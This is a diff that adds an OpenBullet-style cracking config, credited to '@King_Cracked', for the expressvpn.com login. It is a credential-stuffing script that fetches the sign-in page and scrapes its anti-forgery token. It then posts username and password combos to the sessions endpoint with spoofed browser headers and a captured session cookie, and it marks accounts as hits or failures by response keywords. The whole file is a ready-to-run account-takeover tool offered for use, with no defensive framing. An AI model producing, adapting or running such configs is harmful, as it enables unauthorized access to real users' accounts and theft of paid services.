@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "expressvpn.com v21 Config By @King_Cracked",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-12T19:01:00.0801777+03:30",
+  "AdditionalInfo": "",
+  "Author": "@King_Cracked",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#G REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "cookie: landing_page=https://www.expressvpn.com/; xvid=ZoQZBptvjWG_WKVVjCtI2ejFmTI3ulLMAb8LoLNVRcYyTmuH2TNm6g%3D%3D; xvsrcorganic=google; locale=; _gaexp=GAX1.2.OLNMOKfRSV-YDTCrHk1bHQ.19123.1; _gcl_au=1.1.1669653712.1644679392; _gid=GA1.2.1624606581.1644679394; _gat_UA-8164236-1=1; _fbp=fb.1.1644679395759.2138867305; xv_ab=%7B%22order_page_experiments%22%3A%22webco250_202201_social_proof_variant%22%7D; xvgtm=%7B%22location%22%3A%22US%22%2C%22logged_in%22%3Afalse%2C%22report_aid_to_ga%22%3Afalse%7D; forterToken=c23a0b38525c4155a4447b5dabdb97ae_1644679406424___13ck; _gat=1; _ga_ZDM0C7DHZZ=GS1.1.1644679391.1.1.1644679410.41; _ga=GA1.1.366923436.1644679394; _uetsid=b2adf0808c1711ecb3627ff897b7ae59; _uetvid=b2ae4c308c1711ec9728a94e826fd360; SnapABugRef=https%3A%2F%2Fwww.expressvpn.com%2Fsign-in%20https%3A%2F%2Fwww.expressvpn.com%2F; SnapABugHistory=1#; SnapABugUserAlias=%23; SnapABugVisit=1#1644679411; _clck=2yt1kj|1|eyx|0; _clsk=r170c7|1644679412769|1|0|i.clarity.ms/collect; _xv_web_frontend_session=cVFVZXlOUkprRk5HOVU2a3RmTzBaQ1FHWStaTi9laGhHT3A1UUNINFpFUUgrYWtIakIrYm8zOXQvcGRDTUY2TjZwRXBkZTZFTlRsRHFJb1c5TTBpdStPblpnOE9WT3ZGdlB3eUx1VCtDMHFoNDdpOXZnTkZiQVpxejlRcUhhTjVQQjUxK1ovQWMvb0VxbXV5VjRlZzFBRFZXeU92c2ZIQkVoM0tGZ3FjTTlnN2ZodEJ3MEF0Mnl6Ri9OMFFKWkc0OWxUUUhZNm5TbkQrMFZpZ3hsM3Bjdk1QOC9VN3VEOXIxTWlPakNwaCtBM3pJUU5uOEhKNFN3VG9EN1dKQTlSdC0tcGdyRU9RMC9MQWVaRVRPaXNkWEkxUT09--f96e03f29e8fe7dd48224c17a6af38ed911412f8" 
+  HEADER "referer: https://www.expressvpn.com/sign-in" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+
+#TK PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"authenticity_token\" value=\"" "\" />" -> VAR "TK" 
+
+#P REQUEST POST "https://www.expressvpn.com/sessions" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TK>&location_fragment=&redirect_path=&email=<USER>&password=<PASS>&commit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 233" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: https://www.expressvpn.com/sign-in" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Success OR 
+    KEY "Verification Needed" 
+
